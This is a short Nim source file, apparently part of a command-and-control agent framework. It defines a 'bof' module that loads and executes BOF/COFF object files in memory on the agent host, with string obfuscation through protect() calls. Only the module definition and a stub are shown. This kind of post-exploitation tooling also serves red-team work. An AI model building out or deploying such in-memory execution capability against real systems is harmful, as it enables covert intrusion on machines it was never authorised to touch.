import ../common/[types, utils]

# Define function prototype
proc executeBof(ctx: AgentCtx, task: Task): TaskResult 

# Module definition
let module* = Module(
    name: protect("bof"),
    description: protect("Load and execute BOF/COFF files in memory."),
    moduleType: MODULE_BOF,
    commands: @[
        Command(
            name: protect("bof"),
            commandType: CMD_BOF,
            description: protect("Execute an object file in memory and retrieve the output."),
            example: protect("bof /path/to/dir.x64.o C:\\Users"),
            arguments: @[
                Argument(name: protect("path"), description: protect("Path to the object file to execute."), argumentType: BINARY, isRequired: true),
                Argument(name: protect("arguments"), description: protect("Arguments to be passed to the object file. Arguments are handled as STRING, unless specified with a prefix ([i]:INT, [w]:WSTRING, [s]:SHORT; the colon separates prefix and value)"), argumentType: STRING, isRequired: false)
            ],
            execute: executeBof
        )
    ] 
)

# Implement execution functions
when not defined(agent):
    proc executeBof(ctx: AgentCtx, task: Task): TaskResult = nil

